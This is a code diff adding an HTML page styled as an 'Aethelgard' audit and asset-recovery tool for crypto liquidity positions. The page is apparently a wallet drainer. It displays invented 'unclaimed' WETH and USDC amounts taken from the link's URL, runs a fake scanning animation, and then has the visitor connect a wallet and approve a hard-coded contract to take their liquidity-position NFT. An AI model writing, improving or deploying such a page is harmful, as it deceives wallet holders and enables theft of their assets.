@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>AETHELGARD // SOVEREIGN AUDIT</title>
+    <style>
+        body { background-color: #050505; color: #a0a0a0; font-family: 'Courier New', monospace; }
+        .audit-card { border: 1px solid #1a1a1a; background: #0a0a0a; }
+        .glitch-text { color: #00ff41; text-shadow: 0 0 5px #00ff41; }
+        .btn-strike { background-color: #ffffff; color: #000000; transition: all 0.3s ease; }
+        .btn-strike:hover { background-color: #00ff41; box-shadow: 0 0 15px #00ff41; }
+    </style>
+</head>
+<body class="p-10">
+    <div class="max-w-3xl mx-auto">
+        <header class="mb-10 flex justify-between items-center border-b border-zinc-800 pb-4">
+            <h1 class="text-xl font-bold tracking-widest glitch-text">AETHELGARD SYSTEM AUDIT v3.0</h1>
+            <div id="walletStatus" class="text-xs uppercase text-zinc-500">Network: Arbitrum_One</div>
+        </header>
+
+        <main class="audit-card p-8 rounded-lg shadow-2xl">
+            <section id="dossierHeader" class="mb-6 border-l-4 border-emerald-500 pl-4">
+                <h2 class="text-zinc-500 text-xs uppercase mb-1">Target Identification</h2>
+                <div class="text-2xl text-white font-mono" id="caseIdDisplay">Case: LOADING...</div>
+            </section>
+
+            <div class="grid grid-cols-2 gap-6 mb-10">
+                <div class="p-4 bg-zinc-900/50 border border-zinc-800 rounded">
+                    <p class="text-xs uppercase text-zinc-500 mb-2">Unclaimed WETH</p>
+                    <p id="ethAmount" class="text-xl text-emerald-400 font-bold">---</p>
+                </div>
+                <div class="p-4 bg-zinc-900/50 border border-zinc-800 rounded">
+                    <p class="text-xs uppercase text-zinc-500 mb-2">Unclaimed USDC</p>
+                    <p id="usdcAmount" class="text-xl text-emerald-400 font-bold">---</p>
+                </div>
+            </div>
+
+            <div class="border-t border-zinc-800 pt-6">
+                <div class="mb-6 p-4 bg-amber-950/20 border border-amber-900/50 rounded">
+                    <p class="text-xs text-amber-500 uppercase leading-relaxed">
+                        Notice: This position is currently out of range. 
+                        The Atomic Recovery Protocol will claim fees and return NFT collateral in a single block transaction.
+                    </p>
+                </div>
+                
+                <button onclick="initiateRecovery()" class="w-full btn-strike font-bold py-5 rounded uppercase tracking-widest text-sm">
+                    Authorize Recovery Agent
+                </button>
+            </div>
+        </main>
+
+        <footer class="mt-8 text-[10px] text-zinc-700 uppercase tracking-tighter text-center">
+            Contract: 0x70672d76e88e72188dFb7c06cc31141C4AFad7cF // Aethelgard Recovery Vault v3.0
+        </footer>
+    </div>
+
+    <script>
+    const CONTRACT_ADDRESS = "0x70672d76e88e72188dFb7c06cc31141C4AFad7cF";
+    const POSITION_MANAGER = "0xC36442b4a4522E871399CD717aBDD847Ab11FE88";
+    
+    const VAULT_ABI = ["function executeRecovery(uint256 tokenId) external"];
+    const NFT_ABI = ["function approve(address to, uint256 tokenId) external"];
+
+    async function loadAudit() {
+        const urlParams = new URLSearchParams(window.location.search);
+        
+        // FIX: Ensuring it pulls from the URL correctly
+        const caseId = urlParams.get('case') || "AG-PENDING";
+        const ethVal = urlParams.get('eth') || "0.0000";
+        const usdcVal = urlParams.get('usdc') || "0.00";
+
+        document.getElementById('caseIdDisplay').innerText = "Case: " + caseId;
+        
+        // Pass the values to the animation
+        simulateScan(ethVal, usdcVal);
+    }
+
+    function simulateScan(eth, usdc) {
+        let count = 0;
+        const interval = setInterval(() => {
+            document.getElementById('ethAmount').innerText = (Math.random() * 5).toFixed(4) + " ETH";
+            count++;
+            if (count > 15) {
+                clearInterval(interval);
+                document.getElementById('ethAmount').innerText = eth + " ETH";
+                document.getElementById('usdcAmount').innerText = usdc + " USDC";
+            }
+        }, 80);
+    }
+
+    async function initiateRecovery() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const tid = urlParams.get('tid'); 
+
+        if (!tid) return alert("CRITICAL: Position ID missing.");
+
+        try {
+            // STEP 1: Connect Wallet
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const provider = new ethers.BrowserProvider(window.ethereum);
+            const signer = await provider.getSigner();
+            
+            // STEP 2: Initiate Transaction
+            const nftContract = new ethers.Contract(POSITION_MANAGER, NFT_ABI, signer);
+            alert("Action Required: Authorize the Aethelgard Vault.");
+            
+            const tx1 = await nftContract.approve(CONTRACT_ADDRESS, tid);
+            await tx1.wait();
+
+            const vault = new ethers.Contract(CONTRACT_ADDRESS, VAULT_ABI, signer);
+            const tx2 = await vault.executeRecovery(tid);
+            await tx2.wait();
+            
+            alert("SUCCESS: Assets Recovered.");
+        } catch (err) {
+            console.error(err);
+            // This 'err.reason' is what showed you the 'not owner' message. Perfect.
+            alert("Protocol Insight: " + (err.reason || "Transaction Refused by Blockchain or User."));
+        }
+    }
+
+    window.onload = loadAudit;
+</script>
+
+
+</body>
+</html>
